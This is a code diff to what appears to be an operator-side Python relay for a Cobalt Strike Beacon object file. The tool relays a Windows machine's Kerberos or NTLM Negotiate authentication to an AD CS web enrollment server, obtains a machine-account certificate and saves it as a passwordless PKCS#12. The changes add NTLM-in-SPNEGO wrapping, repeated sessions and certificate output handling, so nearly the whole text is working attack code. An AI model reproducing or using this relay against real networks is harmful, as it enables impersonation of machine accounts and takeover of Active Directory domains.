@@ -34,6 +34,9 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
 
 
+# ---------------------------------------------------------------------------
+# KRB1 protocol and shared records
+# ---------------------------------------------------------------------------
 # The wire format is documented in docs/protocol.md. Conservative limits keep
 # a malformed peer or HTTP endpoint from forcing unbounded memory growth.
 MAGIC = b"KRB1"
@@ -83,7 +86,9 @@ class RecordChannel:
     """Length-prefixed KRB1 channel layered over one accepted TCP connection."""
     def __init__(self, sock: socket.socket):
         self.sock = sock
-        self.terminal = False
+        # True after AUTH_OK is sent. At that point the BOF has returned and
+        # later enrollment errors can be reported only by this process.
+        self.bof_released = False
 
     def _read_exact(self, length: int) -> bytes:
         """Read exactly one framing unit despite normal TCP short reads."""
@@ -116,6 +121,9 @@ class RecordChannel:
         self.sock.sendall(struct.pack("!4sBBHI", MAGIC, VERSION, kind, 0, len(payload)) + payload)
 
 
+# ---------------------------------------------------------------------------
+# Minimal persistent HTTP transport
+# ---------------------------------------------------------------------------
 class RawHttpConnection:
     """Minimal persistent HTTP/1.1 client that exposes raw Negotiate headers.
 
@@ -125,7 +133,6 @@ class RawHttpConnection:
     """
     def __init__(self, host: str, address: str, port: int):
         self.host = host
-        self.port = port
         self.sock = socket.create_connection((address, port), timeout=10)
         self.sock.settimeout(20)
         self.pending = bytearray()
@@ -139,6 +146,7 @@ class RawHttpConnection:
         path: str,
         body: bytes = b"",
         authorization: Optional[bytes] = None,
+        authorization_scheme: str = "Negotiate",
         cookie: Optional[str] = None,
     ) -> HttpResponse:
         """Send one request, optionally carrying an opaque SPNEGO record."""
@@ -149,7 +157,7 @@ class RawHttpConnection:
             "Connection: keep-alive",
         ]
         if authorization is not None:
-            headers.append("Authorization: Negotiate " + base64.b64encode(authorization).decode("ascii"))
+            headers.append(f"Authorization: {authorization_scheme} " + base64.b64encode(authorization).decode("ascii"))
         if cookie:
             headers.append("Cookie: " + cookie)
         if body:
@@ -233,8 +241,8 @@ class RawHttpConnection:
         return HttpResponse(status, headers, body)
 
 
-def negotiate_blob(response: HttpResponse) -> Optional[bytes]:
-    """Decode IIS's first non-empty Negotiate challenge, if present."""
+def authentication_blob(response: HttpResponse) -> Optional[bytes]:
+    """Decode IIS's first non-empty HTTP Negotiate challenge."""
     for value in response.headers.get("www-authenticate", []):
         if not value.lower().startswith("negotiate "):
             continue
@@ -246,6 +254,58 @@ def negotiate_blob(response: HttpResponse) -> Optional[bytes]:
     return None
 
 
+# ---------------------------------------------------------------------------
+# NTLM-over-HTTP-Negotiate compatibility
+#
+# The intended path carries a complete SPNEGO/Kerberos token unchanged. RPC's
+# Negotiate provider can instead expose raw NTLMSSP. These two helpers perform
+# only the required HTTP Negotiate wrapper adaptation for that case.
+# ---------------------------------------------------------------------------
+def der_value(tag: int, content: bytes) -> bytes:
+    """Encode one bounded DER TLV used to carry NTLM inside HTTP Negotiate."""
+    length = len(content)
+    if length < 0x80:
+        size = bytes([length])
+    else:
+        raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
+        size = bytes([0x80 | len(raw)]) + raw
+    return bytes([tag]) + size + content
+
+
+def wrap_ntlm_negotiate(token: bytes, initial: bool) -> bytes:
+    """Wrap a raw RPC NTLMSSP leg in the SPNEGO form expected by IIS."""
+    if not token.startswith(b"NTLMSSP\x00"):
+        raise RelayError("invalid RPC NTLMSSP token")
+    response_token = der_value(0xA2, der_value(0x04, token))
+    if not initial:
+        return der_value(0xA1, der_value(0x30, response_token))
+    spnego_oid = der_value(0x06, b"\x2b\x06\x01\x05\x05\x02")
+    ntlm_oid = der_value(0x06, b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a")
+    mech_types = der_value(0xA0, der_value(0x30, ntlm_oid))
+    return der_value(0x60, spnego_oid + der_value(0xA0, der_value(0x30, mech_types + response_token)))
+
+
+def unwrap_ntlm_negotiate(token: bytes) -> bytes:
+    """Extract the raw NTLM challenge that the RPC NTLM provider consumes."""
+    offset = token.find(b"NTLMSSP\x00")
+    if offset < 0 or len(token) - offset < 12:
+        raise RelayError("IIS Negotiate continuation does not contain NTLMSSP")
+    raw = token[offset:]
+    if int.from_bytes(raw[8:12], "little") == 2 and len(raw) >= 48:
+        end = 48
+        for field in (12, 40):
+            length = int.from_bytes(raw[field : field + 2], "little")
+            pointer = int.from_bytes(raw[field + 4 : field + 8], "little")
+            if pointer + length > end:
+                end = pointer + length
+        if end <= len(raw):
+            return raw[:end]
+    return raw
+
+
+# ---------------------------------------------------------------------------
+# Optional token diagnostics
+# ---------------------------------------------------------------------------
 def der_bounds(data: bytes, offset: int) -> Optional[tuple[int, int]]:
     """Return bounded DER content offsets for lightweight diagnostics only."""
     if offset + 2 > len(data):
@@ -334,6 +394,9 @@ def trace_name(value: str) -> str:
     return label or "PEER"
 
 
+# ---------------------------------------------------------------------------
+# ADCS certificate validation and optional artifact output
+# ---------------------------------------------------------------------------
 def serialize_pfx(bundle: CertificateBundle, machine: str) -> bytes:
     """Create a passwordless PKCS#12 only after key/certificate verification."""
     return pkcs12.serialize_key_and_certificates(
@@ -345,11 +408,10 @@ def serialize_pfx(bundle: CertificateBundle, machine: str) -> bytes:
     )
 
 
-def print_pfx(pfx: bytes, options: argparse.Namespace) -> None:
+def print_pfx(pfx: bytes, options: argparse.Namespace, pfx_path: str) -> None:
     """Emit explicit artifact reconstruction and parameterized follow-ons."""
     machine = options.machine
     domain = options.domain
-    pfx_path = options.pfx_out
     encoded = base64.b64encode(pfx).decode("ascii")
     lower_machine = machine.lower()
     artifact_dir = os.path.dirname(os.path.abspath(pfx_path))
@@ -444,6 +506,9 @@ def adcs_error_detail(body: bytes) -> str:
     return code or "the CA returned a denial without a recognizable reason"
 
 
+# ---------------------------------------------------------------------------
+# Relay/enrollment orchestration
+# ---------------------------------------------------------------------------
 def enroll(
     conn: RawHttpConnection,
     domain: str,
@@ -527,7 +592,7 @@ def enroll(
 
 
 def run_session(channel: RecordChannel, options: argparse.Namespace) -> CertificateBundle:
-    """Drive mutual Negotiate legs and enroll once IIS authenticates.
+    """Drive one mutual Negotiate session and enroll once IIS authenticates.
 
     The IIS probe, all 401 continuations, the final 200, CSR submission, and
     certificate retrieval share one RawHttpConnection. Reconnecting would
@@ -547,19 +612,25 @@ def run_session(channel: RecordChannel, options: argparse.Namespace) -> Certific
         # Windows/IIS decides the leg count. Loop until the server returns 200
         # instead of assuming a two- or three-message Kerberos exchange.
         leg = 0
+        ntlm_over_negotiate = False
         while True:
             kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
             if kind == MSG_ERROR:
                 raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
             leg += 1
+            if leg == 1:
+                ntlm_over_negotiate = token.startswith(b"NTLMSSP\x00")
             log(f"Received opaque SPNEGO leg {leg} from {options.machine}; relaying it to {options.adcs_host}{options.auth_path}")
             if options.trace_spnego:
                 print_spnego(f"{client_trace}_TO_{server_trace}", leg, token)
-            response = http.request("GET", options.auth_path, authorization=token)
+            wire_token = wrap_ntlm_negotiate(token, leg == 1) if ntlm_over_negotiate else token
+            response = http.request("GET", options.auth_path, authorization=wire_token)
             if response.status == 401:
-                continuation = negotiate_blob(response)
+                continuation = authentication_blob(response)
                 if not continuation:
                     raise RelayError("IIS returned a bare Negotiate challenge")
+                if ntlm_over_negotiate:
+                    continuation = unwrap_ntlm_negotiate(continuation)
                 inner, error_code = kerberos_inner(continuation)
                 reason = f", KRB-ERROR {error_code}" if error_code is not None else ""
                 log(
@@ -569,26 +640,32 @@ def run_session(channel: RecordChannel, options: argparse.Namespace) -> Certific
                 if options.trace_spnego:
                     print_spnego(f"{server_trace}_TO_{client_trace}", leg, continuation)
                 log(f"IIS requested continuation; returning its opaque SPNEGO response to {options.machine} for leg {leg + 1}")
-                # Do not unwrap, rebuild, or re-encode this binary token; the
-                # BOF inserts it into the live RPCSS context unchanged.
+                # Kerberos/SPNEGO continuations remain byte-for-byte opaque.
+                # Only the explicit raw-NTLM compatibility branch above
+                # removes the HTTP Negotiate wrapper for RPC's NTLM provider.
                 channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
                 continue
             if response.status != 200:
                 raise RelayError(f"IIS authentication returned HTTP {response.status}")
-            final_token = negotiate_blob(response)
+            final_token = authentication_blob(response)
             if options.trace_spnego and final_token:
                 print_spnego(f"{server_trace}_FINAL", leg, final_token)
             log("IIS returned HTTP 200; the persistent HTTP connection is authenticated as the relayed machine account")
             channel.send(MSG_AUTH_OK)
-            channel.terminal = True
+            channel.bof_released = True
             log("Released the BOF at authenticated-HTTP success; enrollment now continues only in Python")
             cookie = response.first("set-cookie")
-            bundle = enroll(http, options.domain, options.machine, options.template, options.enroll_path, options.certificate_path, cookie, log)
-            return bundle
+            return enroll(
+                http, options.domain, options.machine, options.template,
+                options.enroll_path, options.certificate_path, cookie, log,
+            )
     finally:
         http.close()
 
 
+# ---------------------------------------------------------------------------
+# CLI validation and listener lifecycle
+# ---------------------------------------------------------------------------
 def parse_args(argv: list[str]) -> argparse.Namespace:
     """Declare operator-controlled endpoints while retaining safe web defaults."""
     parser = argparse.ArgumentParser()
@@ -608,23 +685,62 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
     parser.add_argument("--trace-spnego", action="store_true")
     parser.add_argument("--export-pfx-b64", action="store_true")
     parser.add_argument("--pfx-out", metavar="PATH")
+    parser.add_argument("--count", type=int, default=1, help="number of independent bridge sessions to accept")
     return parser.parse_args(argv)
 
 
+def pfx_output_path(bundle: CertificateBundle, options: argparse.Namespace) -> Optional[str]:
+    """Resolve a collision-free proof path, including request-ID templates."""
+    configured = options.pfx_out
+    if options.export_pfx_b64 and not configured:
+        configured = f"{options.machine}-machine.pfx"
+    if not configured:
+        return None
+    try:
+        configured = configured.format(request_id=bundle.request_id)
+    except (KeyError, ValueError) as exc:
+        raise RelayError(f"invalid --pfx-out template: {exc}") from exc
+    if getattr(options, "count", 1) > 1 and "{request_id}" not in (options.pfx_out or ""):
+        stem, extension = os.path.splitext(configured)
+        configured = f"{stem}-{bundle.request_id}{extension}"
+    return os.path.abspath(configured)
+
+
+def publish_bundle(bundle: CertificateBundle, options: argparse.Namespace) -> None:
+    """Serialize one verified enrollment without overwriting multi-run proofs."""
+    pfx_path = pfx_output_path(bundle, options)
+    if not (options.export_pfx_b64 or pfx_path):
+        print(f"[+] Machine certificate acquired and key pair verified (request {bundle.request_id})", flush=True)
+        return
+    pfx = serialize_pfx(bundle, options.machine)
+    if pfx_path:
+        create_mode = os.O_EXCL if getattr(options, "count", 1) > 1 else os.O_TRUNC
+        descriptor = os.open(pfx_path, os.O_WRONLY | os.O_CREAT | create_mode, 0o600)
+        with os.fdopen(descriptor, "wb") as output:
+            output.write(pfx)
+        print(f"[+] Saved passwordless machine PKCS#12 to {pfx_path}", flush=True)
+    if options.export_pfx_b64:
+        # An export needs a reconstruction destination even if no local save
+        # was requested. pfx_output_path supplies that default above.
+        print_pfx(pfx, options, pfx_path or os.path.abspath(f"{options.machine}-machine.pfx"))
+    print(f"[+] Machine certificate acquired and key pair verified (request {bundle.request_id})", flush=True)
+
+
 def main(argv: list[str]) -> int:
-    """Accept one authorized bridge peer and save artifacts only on success."""
+    """Accept the requested number of independent authorized bridge peers."""
     options = parse_args(argv)
     for name in ("auth_path", "enroll_path", "certificate_path"):
         if not getattr(options, name).startswith("/"):
             raise SystemExit(f"--{name.replace('_', '-')} must be an absolute HTTP path")
     if any(not 1 <= value <= 65535 for value in (options.port, options.adcs_port)):
         raise SystemExit("TCP ports must be between 1 and 65535")
+    if options.count < 1:
+        raise SystemExit("--count must be at least 1")
     # Resolve the allow value before listening. The common rportfwd_local path
     # appears as 127.0.0.1 regardless of the original target network address.
     allowed_addresses = {
         item[4][0] for item in socket.getaddrinfo(options.allow, None, socket.AF_INET, socket.SOCK_STREAM)
     }
-    last_bundle: Optional[CertificateBundle] = None
     service_spn = f"http/{options.adcs_host}"
     print(
         f"[*] Matching Beacon command: krbrelay {options.port} "
@@ -636,44 +752,31 @@ def main(argv: list[str]) -> int:
         listener.bind((options.listen, options.port))
         listener.listen(1)
         print(f"[*] Awaiting {options.machine} relay on {options.listen}:{options.port}", flush=True)
-        client, peer = listener.accept()
-        with client:
-            if peer[0] not in allowed_addresses:
-                print("[-] Rejected unauthorized bridge peer", flush=True)
-                return 1
-            if options.verbose:
-                print(f"[+] Accepted authorized bridge connection from {peer[0]}", flush=True)
-            channel = RecordChannel(client)
-            try:
-                last_bundle = run_session(channel, options)
-            except (RelayError, OSError, ValueError, TypeError) as exc:
-                # Give the BOF a short, printable policy/transport reason. Any
-                # trace tokens remain local to Python's operator terminal.
-                if not channel.terminal:
-                    try:
-                        channel.send(MSG_ERROR, str(exc).encode("utf-8")[:MAX_ERROR])
-                    except (OSError, RelayError):
-                        pass
-                print(f"[-] Relay failed: {exc}", flush=True)
-                return 1
-    if last_bundle is None:
-        return 1
-    if options.export_pfx_b64 and not options.pfx_out:
-        options.pfx_out = f"{options.machine}-machine.pfx"
-    # Deliberately serialize only after certificate/key/EKU verification and a
-    # successful bridge session. The standalone default leaves no artifact.
-    if options.export_pfx_b64 or options.pfx_out:
-        pfx = serialize_pfx(last_bundle, options.machine)
-        if options.pfx_out:
-            options.pfx_out = os.path.abspath(options.pfx_out)
-            descriptor = os.open(options.pfx_out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
-            with os.fdopen(descriptor, "wb") as output:
-                output.write(pfx)
-            print(f"[+] Saved passwordless machine PKCS#12 to {options.pfx_out}", flush=True)
-        if options.export_pfx_b64:
-            print_pfx(pfx, options)
-    print(f"[+] Machine certificate acquired and key pair verified (request {last_bundle.request_id})", flush=True)
-    return 0
+        failed = False
+        for session_number in range(1, options.count + 1):
+            client, peer = listener.accept()
+            with client:
+                channel = RecordChannel(client)
+                if peer[0] not in allowed_addresses:
+                    print("[-] Rejected unauthorized bridge peer", flush=True)
+                    failed = True
+                    continue
+                if options.verbose:
+                    print(
+                        f"[+] Accepted authorized bridge connection {session_number}/{options.count} "
+                        f"from {peer[0]}", flush=True,
+                    )
+                try:
+                    publish_bundle(run_session(channel, options), options)
+                except (RelayError, OSError, ValueError, TypeError) as exc:
+                    if not channel.bof_released:
+                        try:
+                            channel.send(MSG_ERROR, str(exc).encode("utf-8")[:MAX_ERROR])
+                        except (OSError, RelayError):
+                            pass
+                    print(f"[-] Relay failed: {exc}", flush=True)
+                    failed = True
+        return 1 if failed else 0
 
 
 if __name__ == "__main__":
